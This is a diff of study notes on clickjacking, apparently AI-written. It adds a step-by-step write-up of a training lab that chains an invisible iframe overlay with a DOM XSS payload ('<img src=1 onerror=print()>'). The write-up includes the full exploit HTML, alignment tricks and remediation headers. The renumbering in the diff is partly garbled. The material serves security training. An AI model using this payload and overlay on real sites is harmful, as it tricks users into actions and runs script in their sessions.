@@ -854,7 +854,7 @@ Controls pixel alignment between fake and real button
 
 Makes real page invisible but still clickable
 
-## 📌 10️⃣ REAL-WORLD SCENARIOS
+## 📌 0️⃣ REAL-WORLD SCENARIOS
 
 ### 🧨 1. Banking apps
 
@@ -874,7 +874,7 @@ Makes real page invisible but still clickable
 - change role
 - reset password
 
-## 📌 11️⃣ VARIATIONS
+## 📌 1️⃣ VARIATIONS
 
 ### 🔹 Clickjacking + CSRF combo
 
@@ -888,11 +888,11 @@ URL parameters pre-fill sensitive form values
 
 Multiple pages chained inside iframe
 
-## 📌 12️⃣ MULTI-CHAIN ATTACK MODEL
+## 📌 2️⃣ MULTI-CHAIN ATTACK MODEL
 
 Click → iframe action → authenticated request → sensitive change → backend update
 
-## 📌 13️⃣ REMEDIATION
+## 📌 3️⃣ REMEDIATION
 
 ### 🛡️ 1. X-Frame-Options
 
@@ -920,7 +920,7 @@ Modern and stronger protection.
 
 CSRF does NOT stop clickjacking
 
-## 📌 14️⃣ KEY MINDSET
+## 📌 4️⃣ KEY MINDSET
 
 Clickjacking is not about hacking code — it's about hacking human perception of UI
 
@@ -931,3 +931,223 @@ Clickjacking works by hiding a real sensitive button inside an iframe and tricki
 If you want next, I can upgrade your understanding to:
 
 👉 “real bug bounty clickjacking techniques (zero-frame-busting + CSP bypass + multi-step attacks)”
+
+---
+
+# 🧠 Lab-4 CLICKJACKING + DOM XSS (print() LAB) 
+
+## 📌 1️⃣ OVERVIEW
+
+This lab combines Clickjacking + DOM XSS.
+
+User is tricked into clicking a hidden real button → which triggers a DOM XSS payload → executes `print()`
+
+So it is a two-layer attack:
+
+- UI deception (clickjacking)
+- Code execution (XSS)
+
+## 📌 2️⃣ WHAT IS THE TOPIC?
+
+### 🧩 Concepts involved:
+
+- Clickjacking (UI redressing)
+- DOM-based XSS
+- iframe embedding
+- Event-based XSS (`onerror=print()`)
+
+### 🧩 Goal:
+
+Force victim to trigger `print()` without realizing it
+
+## 📌 3️⃣ VULNERABILITY IDEA
+
+Target page contains:
+
+```html
+<img src=1 onerror=print()>
+```
+
+Meaning:
+
+- Image fails to load
+- `onerror` triggers JavaScript
+- `print()` executes
+
+## 📌 4️⃣ WHY IT IS VULNERABLE
+
+User input is reflected directly into HTML without sanitization
+
+So attacker-controlled input becomes executable code.
+
+## 📌 5️⃣ ATTACK FLOW (HIGH LEVEL)
+
+1️⃣ Attacker injects XSS payload in URL  
+2️⃣ Page executes `print()` when triggered  
+3️⃣ Clickjacking overlay hides real page  
+4️⃣ User clicks fake button  
+5️⃣ Real XSS triggers
+
+## 📌 6️⃣ LAB WALKTHROUGH (STEP-BY-STEP)
+
+### 🟢 Step 1 — Open exploit server
+
+Insert HTML payload
+
+### 🟢 Step 2 — Load vulnerable page inside iframe
+
+```text
+/feedback?name=<img src=1 onerror=print()>
+```
+
+### 🟢 Step 3 — Add clickjacking overlay
+
+```html
+<div>Click me</div>
+```
+
+User thinks this is harmless.
+
+### 🟢 Step 4 — Align overlay
+
+Use:
+
+- `opacity = 0.1` (debug mode)
+- adjust `top/left` until button matches real “Submit”
+
+### 🟢 Step 5 — Finalize attack
+
+Set:
+
+```css
+opacity = 0.0001;
+```
+
+### 🟢 Step 6 — Deliver exploit
+
+Victim clicks fake button
+
+### 🟢 Step 7 — XSS triggers
+
+`print()` function executes
+
+## 📌 7️⃣ FINAL PAYLOAD
+
+```html
+<style>
+iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+}
+
+div {
+    position: absolute;
+    top: 610px;
+    left: 80px;
+    z-index: 1;
+}
+</style>
+
+<div>Click me</div>
+
+<iframe
+src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test#feedbackResult">
+</iframe>
+```
+
+## 📌 8️⃣ PAYLOAD BREAKDOWN
+
+### 🧩 iframe
+
+Loads vulnerable page inside attacker page
+
+### 🧩 XSS payload
+
+```html
+<img src=1 onerror=print()>
+```
+
+Executes JavaScript when image fails.
+
+### 🧩 div overlay
+
+Fake clickable UI shown to user
+
+### 🧩 opacity
+
+Hides real page but keeps it clickable
+
+### 🧩 positioning
+
+Aligns fake click with real submit button
+
+## 📌 9️⃣ REAL-WORLD SCENARIOS
+
+- Forced popup printing
+- Fake login redirects
+- Hidden malware execution
+- Session stealing via chained XSS
+- UI trick attacks in phishing pages
+
+## 📌 0️⃣ VARIATIONS
+
+### 🔹 Clickjacking + stored XSS
+
+### 🔹 Clickjacking + DOM XSS
+
+### 🔹 Clickjacking + CSRF action
+
+### 🔹 Multi-step iframe chaining attacks
+
+## 📌11️⃣ ATTACK CHAIN MODEL
+
+```text
+Fake button click
+    ↓
+iframe triggers URL
+    ↓
+DOM XSS executes
+    ↓
+JavaScript runs (print)
+```
+
+## 📌 2️⃣ REMEDIATION
+
+### 🛡️ 1. CSP (Content Security Policy)
+
+```http
+script-src 'self'
+```
+
+### 🛡️ 2. Input sanitization
+
+- escape HTML
+- block event handlers like `onerror`
+
+### 🛡️ 3. X-Frame-Options
+
+```http
+DENY
+SAMEORIGIN
+```
+
+### 🛡️ 4. frame-ancestors CSP
+
+```http
+frame-ancestors 'none'
+```
+
+## 📌 3️⃣ KEY MINDSET
+
+Clickjacking is UI manipulation, XSS is code execution — combining both removes user awareness completely.
+
+## 🔥 FINAL SUMMARY
+
+This lab uses clickjacking to force a user click on a hidden iframe that contains a DOM XSS payload, which executes `print()` when triggered.
+
+If you want next, I can give you:
+
+👉 “a master map of all clickjacking lab types + how to recognize them instantly in exams”
